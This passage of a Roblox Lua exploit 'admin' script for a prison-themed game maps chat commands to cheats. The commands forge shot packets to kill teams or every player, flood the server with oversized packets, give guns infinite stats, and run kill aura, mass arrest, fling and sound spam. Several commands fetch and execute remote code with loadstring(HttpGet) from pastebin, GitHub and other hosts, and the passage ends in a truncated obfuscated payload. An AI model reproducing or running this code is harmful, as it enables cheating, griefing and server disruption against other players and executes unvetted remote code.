game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
            elseif msg:match(prefix .. "god off") then
_G.toggle = false
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)
 
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = true
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
wait(5)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = true
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
			elseif msg:match(prefix .. "i") then
				workspace.Remote.TeamEvent:FireServer("Bright orange")
			elseif msg:match(prefix .. "g") then
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			elseif msg:match(prefix .. "neu") then
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			elseif msg:match(prefix .. "btools") then
				local tool1   = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
				tool1.BinType = "Hammer"
			elseif msg:match(prefix .. "crim") then
				local pos2 = LocalPlayer.Character.HumanoidRootPart.CFrame
				LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				wait(.2)
				LocalPlayer.Character.HumanoidRootPart.CFrame = pos2
			elseif msg:match(prefix .. "k g") then
                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game:GetService("Teams").Guards:GetPlayers()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.2)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
			elseif msg:match(prefix .. "k c") then
                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game:GetService("Teams").Criminals:GetPlayers()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.2)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
			elseif msg:match(prefix .. "k i") then
                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game:GetService("Teams").Inmates:GetPlayers()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.2)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
			elseif msg:match(prefix.."k all") then
                                function getPacketFromPlayer(tget)
                                        return {
                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
                                                ["Distance"] = 0,
                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
                                                ["Hit"] = tget.Character.Head
                                        }
                                end
                                local arg1 = {}
                                for i, v in pairs(game.Players:GetChildren()) do
                                        for i2 = 1, 7 do
                                                table.insert(arg1, getPacketFromPlayer(v))
                                        end
                                end
                               
                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                wait(0.2)
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = 15
sM["MaxAmmo"] = 6
sM["CurrentAmmo"] = 6
sM["StoredAmmo"] = 600
sM["FireRate"] = 0.8
sM["AmmoPerClip"] = 6
sM["Range"] = 400
sM["ReloadTime"] = 4
sM["Bullets"] = 5
sM["AutoFire"] = false
			elseif msg:match(prefix .. "megaspike") then
				local PackageSize = 50000
				local SendPackageAmountOfTimes = 7

				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer

				local ItemHandler = workspace:WaitForChild("Remote").ItemHandler
				game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)

				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				local Tool = Players.LocalPlayer.Backpack["AK-47"]
				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				local Tool = Players.LocalPlayer.Backpack["Remington 870"]
				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				local Tool = Players.LocalPlayer.Backpack["M9"]

				local Packet = {
					RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
					Distance = 5000,
					Cframe = CFrame.new(0, 0, 0),
					Hit = workspace:FindFirstChildOfClass("Part")
				}

				local Package = {}

				for i = 1, PackageSize do
					Package[i] = Packet
				end

				for i = 1, SendPackageAmountOfTimes do
					ShootEvent:FireServer(Package, Tool)
				end
			elseif msg:match(prefix .. "re") then
				loadchar()
			elseif msg:match(prefix .. "rj") then
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Rejoin = coroutine.create(function()
    local Success, ErrorMessage = pcall(function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)

    if ErrorMessage and not Success then
        warn(ErrorMessage)
    end
end)

coroutine.resume(Rejoin)
			elseif msg:match(prefix .. "punish on") then
_G.toggle = true

while _G.toggle == true do
wait()
local function punish()
local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
Workspace.Remote.TeamEvent:FireServer("Bright blue")
game:GetService("Workspace").Remote.loadchar:InvokeServer()
wait(0.1)
function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  

        wait(0.1)
        function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  
        wait(0.1)
        function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end 
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  
        wait(0.1)
        function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  
       wait(0.2)
       game:GetService("Workspace").Remote.loadchar:InvokeServer()
       Workspace.Remote.TeamEvent:FireServer("Medium stone grey")
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
         wait(0.1)
         game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) --Remington 870
         wait(0.1)
         function getPacketFromPlayer(tget)
         return {
         ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
         ["Distance"] = 0,
         ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
         ["Hit"] = tget.Character.Head
         }
         end
         local arg1 = {}
         for i,v in pairs(game.Players:GetPlayers()) do
         for i2=1,7 do
         table.insert(arg1,getPacketFromPlayer(v))
         end
         end
         local gun = game.Players.LocalPlayer.Backpack['Remington 870']
         game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun) 
         wait(0.1)
        Workspace.Remote.TeamEvent:FireServer("Bright blue")
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
        end
for i = 1,10 do wait()
	punish()
end
end
			elseif msg:match(prefix .. "punish off") then
_G.toggle = false

while _G.toggle == true do
wait()
local function punish()
local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
Workspace.Remote.TeamEvent:FireServer("Bright blue")
game:GetService("Workspace").Remote.loadchar:InvokeServer()
wait(0.1)
function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  

        wait(0.1)
        function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  
        wait(0.1)
        function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end 
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  
        wait(0.1)
        function getPacketFromPlayer(tget)
        return {
        ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
        ["Distance"] = 0,
        ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
        ["Hit"] = tget.Character.Torso
        }
        end
        local arg1 = {}
        for i,v in pairs(game.Players:GetPlayers()) do
        for i2=1,7 do
        table.insert(arg1,getPacketFromPlayer(v))
        end
        end
        local gun = game.Players.LocalPlayer.Backpack['Taser']
        game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)  
       wait(0.2)
       game:GetService("Workspace").Remote.loadchar:InvokeServer()
       Workspace.Remote.TeamEvent:FireServer("Medium stone grey")
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
         wait(0.1)
         game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) --Remington 870
         wait(0.1)
         function getPacketFromPlayer(tget)
         return {
         ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
         ["Distance"] = 0,
         ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
         ["Hit"] = tget.Character.Head
         }
         end
         local arg1 = {}
         for i,v in pairs(game.Players:GetPlayers()) do
         for i2=1,7 do
         table.insert(arg1,getPacketFromPlayer(v))
         end
         end
         local gun = game.Players.LocalPlayer.Backpack['Remington 870']
         game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun) 
         wait(0.1)
        Workspace.Remote.TeamEvent:FireServer("Bright blue")
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
        end
for i = 1,10 do wait()
	punish()
end
end

			elseif msg:match(prefix .. "prefix ") then
				prefix = (msg:sub(9))
				ConsoleMessage("[Edited Admin] Your prefix is " .. msg:sub(9))
			elseif msg:match(prefix .. "ws ") then
			    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (msg:sub(5))
			elseif msg:match(prefix .. "jp ") then
			    game.Players.LocalPlayer.Character.Humanoid.JumpPower = (msg:sub(5))
			elseif msg:match(prefix .. "saui") then
			    loadstring(game:HttpGet('https://raw.githubusercontent.com/kinnny/PLSpamArrest/main/SpamArrest%20V2%20Obfuscated.lua'))()
			elseif msg:match(prefix .. "sagui") then
				loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
				wait(0.3)
			    	loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
				wait(0.3)
				loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
			elseif msg:match(prefix .. "fling") then
			    --[[ 
                R6 only
                The game you need to be on needs to have collision enabled! (able to bump into players)
                --]]

                power = 500 -- change this to make it more or less powerful

                game:GetService('RunService').Stepped:connect(function()
                game.Players.LocalPlayer.Character.Head.CanCollide = false
                game.Players.LocalPlayer.Character.Torso.CanCollide = false
                game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
                game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
                end)

                wait(.1)
                local bambam = Instance.new("BodyThrust")
                bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
                bambam.Force = Vector3.new(power,0,power)
                bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 
			elseif msg:match(prefix .. "ring") then
				while wait() do
					for i, v in pairs(game.Players:GetChildren()) do
						pcall(
							function()
								local A_1 = game:GetService("Workspace")["Prison_guardspawn"].spawn.Sound
								local A_2 = v.Character.Head
								local Event = game:GetService("ReplicatedStorage").SoundEvent
								Event:FireServer(A_1, A_2)
							end
						)
					end
				end
			elseif msg:match(prefix .. "headless") then
				LocalPlayer.Character.Head.Transparency = 1
				for i, v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
					if (v:IsA("Decal")) then
						v:Destroy()
					end
				end
			elseif msg:match(prefix .. "noleg") then
				LocalPlayer.Character["Right Leg"]:Destroy()
			elseif msg:match(prefix .. "opguns") then
local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = math.huge
sM["MaxAmmo"] = math.huge
sM["CurrentAmmo"] = math.huge
sM["StoredAmmo"] = math.huge
sM["FireRate"] = -math.huge
sM["AmmoPerClip"] = 600
sM["Range"] = 3000
sM["ReloadTime"] = -math.huge
sM["Bullets"] = 5
sM["AutoFire"] = true
wait(0.1)
local pistol = player.Backpack:FindFirstChild("M9")
local sM = require(pistol:FindFirstChild("GunStates"))
sM["Damage"] = math.huge
sM["MaxAmmo"] = math.huge
sM["CurrentAmmo"] = math.huge
sM["StoredAmmo"] = math.huge
sM["FireRate"] = -math.huge
sM["AmmoPerClip"] = 600
sM["Range"] = 3000
sM["ReloadTime"] = -math.huge
sM["Bullets"] = 5
sM["AutoFire"] = true
wait(0.1)
local crimgun = player.Backpack:FindFirstChild("AK-47")
local sM = require(crimgun:FindFirstChild("GunStates"))
sM["Damage"] = math.huge
sM["MaxAmmo"] = math.huge
sM["CurrentAmmo"] = math.huge
sM["StoredAmmo"] = math.huge
sM["FireRate"] = -math.huge
sM["AmmoPerClip"] = 600
sM["Range"] = 3000
sM["ReloadTime"] = -math.huge
sM["Bullets"] = 5
sM["AutoFire"] = true
wait(0.1)
local assault = player.Backpack:FindFirstChild("M4A1")
local sM = require(assault:FindFirstChild("GunStates"))
sM["Damage"] = math.huge
sM["MaxAmmo"] = math.huge
sM["CurrentAmmo"] = math.huge
sM["StoredAmmo"] = math.huge
sM["FireRate"] = -math.huge
sM["AmmoPerClip"] = 600
sM["Range"] = 3000
sM["ReloadTime"] = -math.huge
sM["Bullets"] = 5
sM["AutoFire"] = true
			elseif msg:match(prefix .. "invis") then
local player = game.Players.LocalPlayer
position     = player.Character.HumanoidRootPart.Position
wait(0.1)
player.Character:MoveTo(position + Vector3.new(0, 1000000, 0))
wait(0.1)
humanoidrootpart = player.Character.HumanoidRootPart:clone()
wait(0.1)
player.Character.HumanoidRootPart:Destroy()
humanoidrootpart.Parent = player.Character
player.Character:MoveTo(position)
			
			elseif msg:match(prefix .. "adonis") then
				loadstring(game:HttpGet("https://pastebin.com/raw/MQ3wc7Zq", true))()
			elseif msg:match(prefix .. "kcf") then
				local Remote = game.Workspace.Remote['ItemHandler']
 
				local Arguments = {
        			[1] = Workspace.Prison_ITEMS.single:WaitForChild("Key card").ITEMPICKUP
				}
 
				Remote:InvokeServer(unpack(Arguments))
				
			elseif msg:match(prefix .. "key ") then
		for i,v in pairs(GetPlayer(msg:sub(8))) do
		Workspace.Prison_ITEMS.single:WaitForChild("Key card")
		local mainhand = game.Players.LocalPlayer.Backpack:FindFirstChild("Key card").Handle
		mainhand.Size = Vector3.new(5, 5, 5)
		local NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.Humanoid.Name = 1
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		wait(0.2)
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		wait(0.2)
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,x in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(x)
		end
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
		wait(0.2)
		for i,x in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(x)
		end
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
		wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
		wait(0.01)
		game.Players.LocalPlayer.Character:MoveTo(v.Character.Position)
		wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
		wait(0.001)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local A_1 = "\66\114\111\121\111\117\98\97\100\100"
local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
wait(0.01)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-936.546631, 94.1287842, 1990.08435)
end
			    elseif msg:match(prefix .. "ca") then
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
 
Text = ("click arrest on motha fucka go arrest :)");
 
Color = Color3.new(0,255,0);
 
FontSize = Enum.FontSize.Size24;
 
})
 
   local mouse = game.Players.LocalPlayer:GetMouse()
   local arrestEvent = game.Workspace.Remote.arrest
   mouse.Button1Down:connect(function()
   local obj = mouse.Target
   local response = arrestEvent:InvokeServer(obj)
   end)
			    elseif msg:match(prefix .. "ar all") then
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
 
Text = ("arresting idiots...");
 
Color = Color3.new(0,255,0);

FontSize = Enum.FontSize.Size24;
 
})
 
     wait(0.1)
local Player = game.Players.LocalPlayer
local cpos = Player.Character.HumanoidRootPart.CFrame
for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
if v.Name ~= Player.Name then
local i = 10
    repeat
    wait()
    i = i-1
    game.Workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
    Player.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
    until i == 0
end
end
			    elseif msg:match(prefix .. "ka") then
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
 
Text = ("E = KillAura");
 
Color = Color3.new(255,0,0);
 
FontSize = Enum.FontSize.Size24;
 
})
 
plr = game:service'Players'.LocalPlayer
char = plr.Character
mouse = plr:GetMouse()
on = false
 
mouse.KeyDown:connect(function(key)
  if key == "e" then
      on = true
  end
end)
 
mouse.KeyUp:connect(function(key)
  if key == "e" then
      on = false
  end
end)
 
while wait(0.1) do
  for i, b in pairs(game.Players:GetChildren()) do
      if b.Name ~= plr.Name and not b:IsFriendsWith(plr.UserId) and on then
          for i = 1, 10 do
              game.ReplicatedStorage.meleeEvent:FireServer(b)
          end
      end
  end
end
 
 
while true do
 wait(0.01)
 for i,v in pairs (game.Players:GetChildren()) do
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame
   game.ReplicatedStorage.meleeEvent:FireServer(v.Name)
   wait(.8)
 end
end
			    elseif msg:match(prefix .. "chat") then
                    loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
			    elseif msg:match(prefix .. "barcodehub") then
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
		Text = "Barcodehub Continued By onceuponatimeidk#1766 Credits To Barcode (Disabled On Discord Though)",
		Color = Color3.fromRGB(220, 188, 129)
	    })
	    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
		Text = "Barcodehub Prefix Is Currently -",
		Color = Color3.fromRGB(220, 188, 129)
	    })
	    
        --[[
        AztupBrew(Fork of IronBrew2): obfuscation; Version 2.7.2
        ]]
        return(function(h,m,p)local k=string.char;local e=string.sub;local n=table.concat;local o=math.ldexp;local r=getfenv or function()return _ENV end;local l=select;local f=unpack or table.unpack;local i=tonumber;local function q(h)local b,c,f="","",{}local d=256;local g={}for a=0,d-1 do g[a]=k(a)end;local a=1;local function j()local b=i(e(h,a,a),36)a=a+1;local c=i(e(h,a,a+b-1),36)a=a+b;return c end;b=k(j())f[1]=b;while a<#h do local a=j()if g[a]then c=g[a]else c=b..e(b,1,1)end;g[d]=b..e(c,1,1)f[#f+1],b,d=c,c,d+1 end;return table.concat(f)end;local j=q('1I1127510182751121Y22S23922923122O23C22S237101727922Q23022T23523722S1010279218101327922M21Y101527922A23522O230121128227922X23223122T101927921V23722W23322U23523127J1627923322S23823923722O23127K27928M23022O23927S1427922U23822O23728G28327522Q28L2301028927523623228G29L1129N22U28B27522U28727S28S27527E27G27I236101A27922523222Q28Z2A127H28R27921U22X29529628G29Z1121U23223328U22Q23927Y2751E2791029827523123223A27I29K27928Z2902AY1128622W2372A429F1129W23027S1B27927B23922A27I23B22W22Q29Y2792AC2A3102BJ2752BL2BU2BC2AX27923922O22R23127S27L27528M23627I23929127523223922X2BV2BE22729X102AL23128P2A227J2AT112BH2B429M23822R2CU27926P21Q2791122V2D523U28A2D5111X26K112CU27U111H27X2DF2DL21321T2DK1N2DA27Y1521L2DH2DQ27U1J2141128929Q1J259112832BE1X2752E6112981J27527L2C92D528327L27Y2E82E52EM2AL2EM2B827929Q2982BE112742DX2DZ28I28I2751X26D112EZ112781126V2F62DA2792F92BJ2EO2422F4112BJ27U172262B41F2DR2E52DU2752FO27U2DT2DH22T2DA2DN2DK21B2DA2BJ2FV2752G12EX2E02G82752E32EM2E72E92EP112ED112EF2DB2EM2EJ2DC2GE2832EO2832EQ2752ES2EM2792162DA2F22FH28S2A62DY2FA1D2792GZ2782782A61725V2FH2GX27U2782G4112HE2GG2EY2FH2F12F32F52F72F92782DH2752FD112FF2FH2FJ2GI2FM2891W2FP2HH2I32FU2FR112FX27U213192DK21C2DA1C2FQ2DH2IF2I72DH2212DA2H32E12792GB2EA2F12GO2EB2GG2EE2GI2GK2EI2DL2EL2EA2GQ2IW2DB2GU2EU21W2GY2HO2HW112H22DZ2782H52HN2FA2H92GI2HC28I21T2DA2HG2I82JP2IL2752JA2G72F52JJ2HP2HU2FA2HT2F82FI2JD2792FG28I2HZ2FL2B421N2I42I82KD2JU2I92IO2DZ2IQ2GA2E42IT2GN2GC2IW2GH2GJ2DB2J12EK2IV2J52GS2G92IW2EU22R2JB2H02JE2DC2DE2F52DH2DJ28I27Y2EK2L82FH2FO1J2982BJ2AV2792472L62DB24Z2FH2A62LE2FA2762752DJ2782LD2JM2FH22K2JQ2II2752M22KH2L32JX2HM2DC2JC28I2HQ2K22D52HV2HX2K92DA2KB2892282KE2DH2MN2DH1G27T2DL27924Y2AW2AW24X29L2CF29R28X28M29T29Q2362CZ2D12752D32N9111P2DO2EG27N27P27R2C227523A22X22W2962NK29R22O23B22S29E2992CN2AL2C02A42A62752A82AA2312C02772AF2AH28Y2AR2B31H27922123829423323222W22T22B2322CH22929C2CE2EG21U21Z28Y2CW2BX27A27C2BN2372BP2BR2CX1121Z23229T2F71122E23223722Y2362862P32EG22B22S2302CH27S2F0112B022O22T22Q2O9102JI1122023323B23222Y22S2P02NT27J2EG2382332PG22Y2BW2842C423729623721Y23822W2CO28427C2AN2NJ1K2O829522422O2Q222A23C23629623022422S23623622O22U27S2BE22D22S23D2CE21227923E2R928723G1X22G2322381X29C22S1X2OI23A1X2AO1X2CI2RP21222E2NN2962122RV22S28721B2NQ2AN2B02Q62AF28E2PC21E2